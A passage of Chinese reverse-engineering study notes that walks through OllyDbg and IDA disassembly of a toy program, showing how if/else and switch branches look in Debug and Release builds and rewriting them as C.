<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0115F</span>A3C   <span class="token number">00000000</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 相当于 mov eax,0115FA3C</span></pre></td></tr><tr><td data-num="3"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">0115F</span>A3C</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">-</span>c是一个局部变量nNumber</pre></td></tr><tr><td data-num="5"></td><td><pre>eax <span class="token operator">=</span> <span class="token operator">&amp;</span>nNumber</pre></td></tr></table></figure><p>对如下三行进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA25F  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA260  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">60F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE60                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA265  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">85</span>B2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD54EF</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>把ebp<span class="token operator">-</span>c的地址压入栈中，作为参数</pre></td></tr><tr><td data-num="6"></td><td><pre>然后把<span class="token operator">%</span>d压入栈中，作为参数</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">function00AD54EF</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">// 相当于 scanf ("% d",&amp;nNumber);</span></pre></td></tr></table></figure><p>此时我们仍不确定这是一个输入函数，只是猜测，进行验证</p>
<p>当调试到 <code>CALL 00AD54EF</code>  处是无法进行下一步调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164249955.png" alt="image-20220320164249955" /></p>
<p>且窗口栏等待输入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164349601.png" alt="image-20220320164349601" /></p>
<p>如此即可确认为这是一个输入函数</p>
<p>当输入一个值后进入下一个堆栈平衡</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164549637.png" alt="image-20220320164549637" /></p>
<p>此时也可以看到 <code>ebp-c</code>  的地址发生变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164650837.png" alt="image-20220320164650837" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164735522.png" alt="image-20220320164735522" /></p>
<p>如此即可确定 <code>ebp-c</code>  的位置存储的我们输入的值，也即 <code>nNumber = ebp-c</code></p>
<p>对 <code>00ADA26D</code>  处的 <code>CMP DWORD PTR SS:[EBP-C],5</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span> 简介寻址</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">-</span>c 实际上是地址</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span>ebp<span class="token operator">-</span>c<span class="token punctuation">]</span>是个值</pre></td></tr><tr><td data-num="6"></td><td><pre>值是nNumber <span class="token operator">=</span> <span class="token number">123</span></pre></td></tr><tr><td data-num="7"></td><td><pre>cmp <span class="token number">123</span>，<span class="token number">3</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//cmp 只进行对比而不保存结果</span></pre></td></tr><tr><td data-num="9"></td><td><pre>如果cmp对比的值为<span class="token number">0</span>，则表示对比的两个值相等</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 影响了某一标志位是判断是大于还是小于</span></pre></td></tr></table></figure><p>对比完成且影响了标志位，如下代码则根据其对比的结果进行处理</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA271  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">/</span><span class="token number">75</span> <span class="token number">0F</span>         JNZ SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA282</pre></td></tr><tr><td data-num="2"></td><td><pre>jnz判断如果cmp的对比结果为<span class="token number">0</span>，则不进行跳转，若不为<span class="token number">0</span>则进行跳转</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320172803862.png" alt="image-20220320172803862" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>如果输入的参数为<span class="token number">5</span>，则顺序执行。打印nflag<span class="token operator">=</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA273  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span><span class="token number">68</span> <span class="token number">64F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE64       <span class="token punctuation">;</span>  ASCII <span class="token string">"nFlag = 5!"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA278  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span>E8 <span class="token number">99</span>C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>ADA27D  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span><span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre>打印后跳转到JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>ADA280  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span>EB <span class="token number">0</span>D         JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>如果输入的参数不为<span class="token number">5</span>，则跳转。打印nflag<span class="token operator">!=</span><span class="token number">5</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>ADA282  <span class="token operator">|</span><span class="token operator">></span> \<span class="token number">68</span> <span class="token number">74F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE74      <span class="token punctuation">;</span> ASCII <span class="token string">"nFlag != 5!"</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>ADA287  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>AC2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>ADA28C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00</span>ADA28F  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="14"></td><td><pre>分支内容只会执行一条分支，然后跳转或顺序执行到分支外</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320175004716.png" alt="image-20220320175004716" /></p>
<p>主函数还原</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA245  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA248  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE50                       <span class="token punctuation">;</span>  Ascii“请输入flag：”<span class="token punctuation">,</span>LF</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>ADA252  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00</span>ADA255  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F4 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>ADA25C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F4       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00</span>ADA25F  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00</span>ADA260  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">60F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE60                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>ADA265  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">85</span>B2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD54EF</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>ADA26A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>ADA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00</span>ADA271  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">75</span> <span class="token number">0F</span>         JNZ SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA282</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00</span>ADA273  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">64F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE64                       <span class="token punctuation">;</span>  ASCII "nFlag <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="14"></td><td><pre>"</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00</span>ADA278  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">99</span>C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00</span>ADA27D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">00</span>ADA280  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">0</span>D         JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00</span>ADA282  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">74F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE74                       <span class="token punctuation">;</span>  ASCII "nFlag <span class="token operator">!=</span> <span class="token number">5</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="19"></td><td><pre>"</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">00</span>ADA287  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>AC2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">00</span>ADA28C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr></table></figure><p>C 语言格式：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入flag："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> nNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>nNumber <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nFlag = 5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">else</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nFlag != 5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 ida32 中打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180543660.png" alt="image-20220320180543660" /></p>
<p>双击进入，即可看到程序执行代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180619995.png" alt="image-20220320180619995" /></p>
<p>F5 反编译为 c 语言伪代码，更便于分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180856623.png" alt="image-20220320180856623" /></p>
<h2 id="release版识别"><a class="anchor" href="#release版识别">#</a> Release 版识别</h2>
<p>找到主函数 main 进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321173958650.png" alt="image-20220321173958650" /></p>
<h3 id="分析主函数main-2"><a class="anchor" href="#分析主函数main-2">#</a> 分析主函数 main</h3>
<p>对 <code>005D1090</code>  和 <code>005D1095</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D1090  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">68</span>B65E00   PUSH Test<span class="token punctuation">.</span><span class="token number">005</span>EB668</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">005</span>D1095  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">86FFFF</span>FF   CALL Test<span class="token punctuation">.</span><span class="token number">005</span>D1020</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>PUSH输入字符串</pre></td></tr><tr><td data-num="5"></td><td><pre>CALL输出函数或包含输出函数的函数</pre></td></tr></table></figure><p>对 <code>005D109A</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D109A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F8       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>将ebp<span class="token operator">-</span><span class="token number">8</span>的地址给eax</pre></td></tr></table></figure><p>对 <code>005D109D</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D109D  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>给局部变量赋值为<span class="token number">0</span></pre></td></tr></table></figure><p>对 <code>005D10A5</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10A5  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">78</span>B65E00   PUSH Test<span class="token punctuation">.</span><span class="token number">005</span>EB678                       <span class="token punctuation">;</span> <span class="token operator">|</span>Arg1 <span class="token operator">=</span> <span class="token number">005</span>EB678 ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">%</span>d是格式化字符串，常用于输入输出和格式化字符串函数</pre></td></tr></table></figure><p>对 <code>005D10B2</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10B2  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>cmp对比输入的值</pre></td></tr></table></figure><p>根据跳转结构可以看出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175236927.png" alt="image-20220321175236927" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175247502.png" alt="image-20220321175247502" /></p>
<p>在 <code>005D10C4</code>  处可以进行以下理解</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10C4  <span class="token operator">|</span><span class="token operator">></span> \E8 <span class="token number">57FFFF</span>FF   CALL Test<span class="token punctuation">.</span><span class="token number">005</span>D1020                       <span class="token punctuation">;</span> \Test<span class="token punctuation">.</span><span class="token number">005</span>D1020</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>进行了一定的优化，使得俩个分支使用同一个输出函数</pre></td></tr></table></figure><p>如此可以看出 Release 版本的程序相比于 Debug 版本的程序进行了两处优化。</p>
<p>ida 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175626862.png" alt="image-20220321175626862" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175648214.png" alt="image-20220321175648214" /></p>
<h1 id="ifelse多分支"><a class="anchor" href="#ifelse多分支">#</a> ifelse 多分支</h1>
<p>分支结构不止一个 if/else if 等</p>
<h2 id="debug版识别-2"><a class="anchor" href="#debug版识别-2">#</a> Debug 版识别</h2>
<p>找到主函数进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180128184.png" alt="image-20220321180128184" /></p>
<p>if else 结构多分支 Debug 版本特点：</p>
<ul>
<li>由多个 cmp 和 jxx 组合而成</li>
</ul>
<h3 id="分析主函数main-3"><a class="anchor" href="#分析主函数main-3">#</a> 分析主函数 main</h3>
<p>包含或打印函数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA248  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50F</span>E0501   PUSH Test<span class="token punctuation">.</span><span class="token number">0105F</span>E50</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00F</span>BA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00F</span>B6516</pre></td></tr></table></figure><p>判断是否为 0</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">00</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p>不等于 0 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180631008.png" alt="image-20220321180631008" /></p>
<p>判断是否为 1</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA282  <span class="token operator">|</span><span class="token operator">></span> \<span class="token number">837</span>D F4 <span class="token number">01</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr></table></figure><p>不等于 1 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182452119.png" alt="image-20220321182452119" /></p>
<p>如此进行一步步的判断</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180841521.png" alt="image-20220321180841521" /></p>
<p>不同于单分支的是如果相等则直接 jmp 跳出判断</p>
<h2 id="release版识别-2"><a class="anchor" href="#release版识别-2">#</a> Release 版识别</h2>
<p>找到主函数进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181224712.png" alt="image-20220321181224712" /></p>
<p>在多分支的 Release 版本中可以看到这里有个 <code>TEST EAX,EAX</code>  也即 <code>switch case</code>  结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181459143.png" alt="image-20220321181459143" /></p>
<p>也就是说 Debug 版本中的 <code>if else结构</code> 在 Release 版本中被优化成了 <code>switch case结构</code> 。</p>
<h3 id="在ida中的不同之处"><a class="anchor" href="#在ida中的不同之处">#</a> 在 ida 中的不同之处</h3>
<p>Debug 版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182219422.png" alt="image-20220321182219422" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181944998.png" alt="image-20220321181944998" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181959761.png" alt="image-20220321181959761" /></p>
<p>Release 版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182058341.png" alt="image-20220321182058341" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182107306.png" alt="image-20220321182107306" /></p>
<p>不同于 Debug 版本的是，release 版本直接打开即可进入 main 函数且速度较快。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 5</title>
    <url>/article/ca1a73d0.html</url>
    <content><![CDATA[<p>浅浅的放一张爆爆 (´▽`ʃ♡ƪ)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322202022509.png" alt="image-20220322202022509" /></p>
<h2 id="switch少分支识别"><a class="anchor" href="#switch少分支识别">#</a> switch 少分支识别</h2>
<p><code>switch/case</code>  语句与 <code>if/else</code>  语句有很多相同的地方，也有一些不同的地方，例如 <code>if/else</code>  语句在多分支的情况下会被优化成 <code>switch/case</code>  语句。所以说 <code>switch/case</code>  语句类似于语法糖的作用，给 <code>if/else</code>  语句提供了一个容错的作用。</p>
<p>以管理员身份打开 <code>ollydbg</code>  然后右键查找所有字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193002514.png" alt="image-20220322193002514" /></p>
<p>找到 <code>%d</code>  点击进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193043851.png" alt="image-20220322193043851" /></p>
<p><code>f2</code>  进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193123178.png" alt="image-20220322193123178" /></p>
<p><code>f9</code>  执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193325973.png" alt="image-20220322193325973" /></p>
<p>对 <code>主函数main</code>  分析如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322194251152.png" alt="image-20220322194251152" /></p>
<p>在 <code>C语言</code> 中的结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">switch</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        printf</pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        printf</pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        printf</pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">break</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        jmp</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 <code>if/else</code>  中的结构：</p>
